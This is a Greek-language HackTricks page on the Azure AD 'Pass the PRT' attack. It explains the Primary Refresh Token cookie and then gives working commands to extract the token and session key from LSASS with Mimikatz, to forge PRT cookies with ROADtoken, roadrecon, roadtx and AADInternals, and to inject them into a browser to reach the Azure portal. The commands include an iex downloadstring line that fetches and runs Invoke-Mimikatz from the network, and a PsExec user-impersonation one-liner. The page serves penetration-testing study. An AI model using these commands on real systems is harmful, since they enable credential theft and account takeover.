# Az - Pass the PRT

{{#include ../../../banners/hacktricks-training.md}}

## Τι είναι ένα PRT

{{#ref}}
az-primary-refresh-token-prt.md
{{#endref}}

### Ελέγξτε αν έχετε ένα PRT
```
Dsregcmd.exe /status
```
Στην ενότητα SSO State, θα πρέπει να δείτε το **`AzureAdPrt`** ρυθμισμένο σε **YES**.

<figure><img src="../../../images/image (140).png" alt=""><figcaption></figcaption></figure>

Στην ίδια έξοδο μπορείτε επίσης να δείτε αν η **συσκευή είναι συνδεδεμένη στο Azure** (στο πεδίο `AzureAdJoined`):

<figure><img src="../../../images/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

Το cookie PRT ονομάζεται στην πραγματικότητα **`x-ms-RefreshTokenCredential`** και είναι ένα JSON Web Token (JWT). Ένα JWT περιέχει **3 μέρη**, το **header**, το **payload** και την **υπογραφή**, διαχωρισμένα με ένα `.` και όλα κωδικοποιημένα σε url-safe base64. Ένα τυπικό cookie PRT περιέχει το ακόλουθο header και σώμα:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Το πραγματικό **Primary Refresh Token (PRT)** είναι ενσωματωμένο μέσα στο **`refresh_token`**, το οποίο είναι κρυπτογραφημένο με ένα κλειδί υπό τον έλεγχο του Azure AD, καθιστώντας το περιεχόμενό του αδιαφανές και μη αποκρυπτογραφημένο για εμάς. Το πεδίο **`is_primary`** σηματοδοτεί την ενσωμάτωση του κύριου refresh token μέσα σε αυτό το token. Για να διασφαλιστεί ότι το cookie παραμένει συνδεδεμένο με τη συγκεκριμένη συνεδρία σύνδεσης για την οποία προοριζόταν, το `request_nonce` μεταδίδεται από τη σελίδα `logon.microsoftonline.com`.

### Ροή Cookie PRT χρησιμοποιώντας TPM

Η διαδικασία **LSASS** θα στείλει στο TPM το **KDF context**, και το TPM θα χρησιμοποιήσει το **session key** (που συγκεντρώθηκε όταν η συσκευή καταχωρίστηκε στο AzureAD και αποθηκεύτηκε στο TPM) και το προηγούμενο context για να **παράγει** ένα **κλειδί,** και αυτό το **παραγόμενο κλειδί** χρησιμοποιείται για να **υπογράψει το PRT cookie (JWT).**

Το **KDF context είναι** ένα nonce από το AzureAD και το PRT που δημιουργεί ένα **JWT** αναμειγμένο με ένα **context** (τυχαία bytes).

Επομένως, ακόμη και αν το PRT δεν μπορεί να εξαχθεί επειδή βρίσκεται μέσα στο TPM, είναι δυνατό να καταχραστεί το LSASS για να **ζητήσει παραγόμενα κλειδιά από νέα contexts και να χρησιμοποιήσει τα παραγόμενα κλειδιά για να υπογράψει Cookies**.

<figure><img src="../../../images/image (31).png" alt=""><figcaption></figcaption></figure>

## Σενάρια Κατάχρησης PRT

Ως **κανονικός χρήστης** είναι δυνατό να **ζητήσετε τη χρήση PRT** ζητώντας από το LSASS δεδομένα SSO.\
Αυτό μπορεί να γίνει όπως οι **εγγενείς εφαρμογές** που ζητούν tokens από τον **Web Account Manager** (token broker). Ο WAM μεταβιβάζει το αίτημα στο **LSASS**, το οποίο ζητά tokens χρησιμοποιώντας υπογεγραμμένη δήλωση PRT. Ή μπορεί να γίνει με **ροές βασισμένες σε πρόγραμμα περιήγησης (web)** όπου ένα **PRT cookie** χρησιμοποιείται ως **κεφαλίδα** για την πιστοποίηση αιτημάτων στις σελίδες σύνδεσης Azure AS.

Ως **SYSTEM** θα μπορούσατε να **κλέψετε το PRT αν δεν προστατεύεται** από TPM ή να **αλληλεπιδράσετε με τα κλειδιά PRT στο LSASS** χρησιμοποιώντας κρυπτογραφικές APIs.

## Παραδείγματα Επίθεσης Pass-the-PRT

### Επίθεση - ROADtoken

Για περισσότερες πληροφορίες σχετικά με αυτόν τον τρόπο [**ελέγξτε αυτή την ανάρτηση**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). Το ROADtoken θα εκτελέσει το **`BrowserCore.exe`** από τον σωστό κατάλογο και θα το χρησιμοποιήσει για να **αποκτήσει ένα PRT cookie**. Αυτό το cookie μπορεί στη συνέχεια να χρησιμοποιηθεί με τα ROADtools για να πιστοποιήσει και να **αποκτήσει ένα μόνιμο refresh token**.

Για να δημιουργήσετε ένα έγκυρο PRT cookie, το πρώτο πράγμα που χρειάζεστε είναι ένα nonce.\
Μπορείτε να το αποκτήσετε με:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Ή χρησιμοποιώντας [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Μπορείτε να χρησιμοποιήσετε [**roadtoken**](https://github.com/dirkjanm/ROADtoken) για να αποκτήσετε ένα νέο PRT (τρέξτε το εργαλείο από μια διαδικασία του χρήστη που θέλετε να επιτεθείτε):
```powershell
.\ROADtoken.exe <nonce>
```
Ως μία γραμμή:
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το **generated cookie** για να **generate tokens** για **login** χρησιμοποιώντας Azure AD **Graph** ή Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Επίθεση - Χρήση του roadrecon

### Επίθεση - Χρήση του AADInternals και ενός διαρρεύσαντος PRT

`Get-AADIntUserPRTToken` **λαμβάνει το PRT token του χρήστη** από τον υπολογιστή που είναι συνδεδεμένος στο Azure AD ή Hybrid. Χρησιμοποιεί το `BrowserCore.exe` για να αποκτήσει το PRT token.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Ή αν έχετε τις τιμές από το Mimikatz μπορείτε επίσης να χρησιμοποιήσετε το AADInternals για να δημιουργήσετε ένα token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Πηγαίνετε στο [https://login.microsoftonline.com](https://login.microsoftonline.com), διαγράψτε όλα τα cookies για το login.microsoftonline.com και εισάγετε ένα νέο cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Μετά, πηγαίνετε στο [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> Τα υπόλοιπα θα πρέπει να είναι τα προεπιλεγμένα. Βεβαιωθείτε ότι μπορείτε να ανανεώσετε τη σελίδα και το cookie δεν εξαφανίζεται, αν το κάνει, μπορεί να έχετε κάνει ένα λάθος και θα πρέπει να περάσετε ξανά από τη διαδικασία. Αν δεν το κάνει, θα είστε εντάξει.

### Επίθεση - Mimikatz

#### Βήματα

1. Το **PRT (Primary Refresh Token) εξάγεται από το LSASS** (Local Security Authority Subsystem Service) και αποθηκεύεται για μελλοντική χρήση.
2. Το **Session Key εξάγεται στη συνέχεια**. Δεδομένου ότι αυτό το κλειδί εκδίδεται αρχικά και στη συνέχεια επανακρυπτογραφείται από τη τοπική συσκευή, απαιτεί αποκρυπτογράφηση χρησιμοποιώντας ένα DPAPI masterkey. Λεπτομερείς πληροφορίες σχετικά με το DPAPI (Data Protection API) μπορείτε να βρείτε σε αυτούς τους πόρους: [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) και για κατανόηση της εφαρμογής του, ανατρέξτε στην [επίθεση Pass-the-cookie](az-pass-the-cookie.md).
3. Μετά την αποκρυπτογράφηση του Session Key, το **παράγωγο κλειδί και το πλαίσιο για το PRT αποκτώνται**. Αυτά είναι κρίσιμα για τη **δημιουργία του cookie PRT**. Συγκεκριμένα, το παράγωγο κλειδί χρησιμοποιείται για την υπογραφή του JWT (JSON Web Token) που αποτελεί το cookie. Μια ολοκληρωμένη εξήγηση αυτής της διαδικασίας έχει παρασχεθεί από τον Dirk-jan, προσβάσιμη [εδώ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

> [!CAUTION]
> Σημειώστε ότι αν το PRT είναι μέσα στο TPM και όχι μέσα στο `lsass` **το mimikatz δεν θα μπορέσει να το εξάγει**.\
> Ωστόσο, θα είναι δυνατό να **πάρετε ένα κλειδί από ένα παράγωγο κλειδί από ένα πλαίσιο** από το TPM και να το χρησιμοποιήσετε για να **υπογράψετε ένα cookie (ελέγξτε την επιλογή 3).**

Μπορείτε να βρείτε μια **σε βάθος εξήγηση της διαδικασίας που εκτελέστηκε** για την εξαγωγή αυτών των λεπτομερειών εδώ: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

> [!WARNING]
> Αυτό δεν θα λειτουργήσει ακριβώς μετά τις διορθώσεις του Αυγούστου 2021 για να αποκτήσετε τα PRT tokens άλλων χρηστών, καθώς μόνο ο χρήστης μπορεί να αποκτήσει το PRT του (ένας τοπικός διαχειριστής δεν μπορεί να έχει πρόσβαση στα PRT άλλων χρηστών), αλλά μπορεί να έχει πρόσβαση στο δικό του.

Μπορείτε να χρησιμοποιήσετε το **mimikatz** για να εξάγετε το PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Εικόνες από https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../images/image (251).png" alt=""><figcaption></figcaption></figure>

**Αντιγράψτε** το μέρος που είναι επισημασμένο **Prt** και αποθηκεύστε το.\
Εξάγετε επίσης το session key (το **`KeyValue`** του πεδίου **`ProofOfPossesionKey`**) το οποίο μπορείτε να δείτε επισημασμένο παρακάτω. Αυτό είναι κρυπτογραφημένο και θα χρειαστεί να χρησιμοποιήσουμε τα DPAPI masterkeys μας για να το αποκρυπτογραφήσουμε.

<figure><img src="../../../images/image (182).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Αν δεν δείτε κανένα δεδομένο PRT, μπορεί να είναι ότι **δεν έχετε κανένα PRT** επειδή η συσκευή σας δεν είναι συνδεδεμένη με το Azure AD ή μπορεί να τρέχετε **παλιά έκδοση** των Windows 10.

Για να **αποκρυπτογραφήσετε** το session key, πρέπει να **ανυψώσετε** τα προνόμιά σας σε **SYSTEM** για να τρέξετε υπό το πλαίσιο του υπολογιστή ώστε να μπορέσετε να χρησιμοποιήσετε το **DPAPI masterkey για να το αποκρυπτογραφήσετε**. Μπορείτε να χρησιμοποιήσετε τις παρακάτω εντολές για να το κάνετε αυτό:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../images/image (183).png" alt=""><figcaption></figcaption></figure>

#### Επιλογή 1 - Πλήρης Mimikatz

- Τώρα θέλετε να αντιγράψετε και την τιμή Context:

<figure><img src="../../../images/image (210).png" alt=""><figcaption></figcaption></figure>

- Και την τιμή του παραγόμενου κλειδιού:

<figure><img src="../../../images/image (150).png" alt=""><figcaption></figcaption></figure>

- Τέλος, μπορείτε να χρησιμοποιήσετε όλες αυτές τις πληροφορίες για να **δημιουργήσετε PRT cookies**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../images/image (282).png" alt=""><figcaption></figcaption></figure>

- Πηγαίνετε στο [https://login.microsoftonline.com](https://login.microsoftonline.com), καθαρίστε όλα τα cookies για το login.microsoftonline.com και εισάγετε ένα νέο cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
- Στη συνέχεια, πηγαίνετε στο [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> Το υπόλοιπο θα πρέπει να είναι τα προεπιλεγμένα. Βεβαιωθείτε ότι μπορείτε να ανανεώσετε τη σελίδα και το cookie δεν εξαφανίζεται, αν το κάνει, μπορεί να έχετε κάνει ένα λάθος και θα πρέπει να περάσετε ξανά από τη διαδικασία. Αν δεν το κάνει, θα είστε εντάξει.

#### Επιλογή 2 - roadrecon χρησιμοποιώντας PRT

- Ανανεώστε πρώτα το PRT, το οποίο θα αποθηκευτεί στο `roadtx.prt`:
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
- Τώρα μπορούμε να **αιτήσουμε tokens** χρησιμοποιώντας τον διαδραστικό περιηγητή με `roadtx browserprtauth`. Αν χρησιμοποιήσουμε την εντολή `roadtx describe`, βλέπουμε ότι το access token περιλαμβάνει μια αξίωση MFA επειδή το PRT που χρησιμοποίησα σε αυτή την περίπτωση είχε επίσης μια αξίωση MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

#### Επιλογή 3 - roadrecon χρησιμοποιώντας παραγόμενα κλειδιά

Έχοντας το πλαίσιο και το παραγόμενο κλειδί που έχει απορριφθεί από το mimikatz, είναι δυνατόν να χρησιμοποιηθεί το roadrecon για να παραχθεί ένα νέο υπογεγραμμένο cookie με:
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
## Αναφορές

- [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
- [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [https://www.youtube.com/watch?v=x609c-MUZ_g](https://www.youtube.com/watch?v=x609c-MUZ_g)

{{#include ../../../banners/hacktricks-training.md}}
